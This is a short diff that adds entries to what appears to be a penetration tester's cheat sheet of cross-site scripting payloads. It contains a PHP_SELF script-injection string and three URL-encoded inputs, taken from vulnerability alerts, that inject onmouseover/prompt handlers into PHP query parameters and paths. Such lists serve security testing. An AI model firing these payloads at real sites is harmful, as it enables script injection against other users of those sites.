@@ -97,3 +97,11 @@ Some old JS Escapes:
 	
 PHP (GET_SELF):
 	echo%20$_SERVER['PHP_SELF'];/%22%3E%3Cscript%3Ealert('xss')%3C/script%3E%3Cfoo
+	
+	
+	
+	
+From Specific Vuln Alerts:
+	index.php?decoded=94102%22%20onmouseover%3dprompt(929882)%20bad%3d%22&encode=Encode%20>>&idn_version=2003
+	example.php?decode=<<%20Decode&encoded=94102%22%20onmouseover%3dprompt(938200)%20bad%3d%22
+	index.php/%22onmouseover%3d%27prompt%28976724%29%27bad%3d%22%3E
